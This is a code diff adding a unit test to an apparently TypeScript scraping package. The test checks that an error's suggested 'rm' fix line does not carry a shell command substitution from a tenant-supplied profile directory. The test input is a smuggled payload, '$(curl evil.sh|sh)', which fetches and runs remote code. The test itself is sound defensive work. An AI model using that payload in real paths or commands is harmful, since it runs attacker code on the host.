@@ -186,3 +186,17 @@ describe('unit · the two budget/session failures', () => {
     expect(error.meta).toEqual({ scrape: 'orders.daily', key: 'org-1/orders.daily/default' });
   });
 });
+
+describe('unit · a profile directory a shell would read', () => {
+  // `profileDir` is `localBrowser({ profileDir })` — an app value, and on a multi-tenant run it is
+  // composed from a tenant id — and this is the one `fix:` in the package that leads with `rm`.
+  // `renderFixShellArg` passes an ordinary path verbatim (the test above pins that) and
+  // substitutes anything a shell would read; the directory stays in the `cause`, which is prose.
+  test('never reaches the rm line as a command substitution', () => {
+    const error = profileLocked('/var/scrape/$(curl evil.sh|sh)');
+    expect(error.fix).not.toContain('$(');
+    expect(error.fix).not.toContain('|');
+    expect(error.fix).toStartWith('rm -f <the profile directory the cause names>/SingletonLock');
+    expect(error.cause).toContain('/var/scrape/$(curl evil.sh|sh)');
+  });
+});
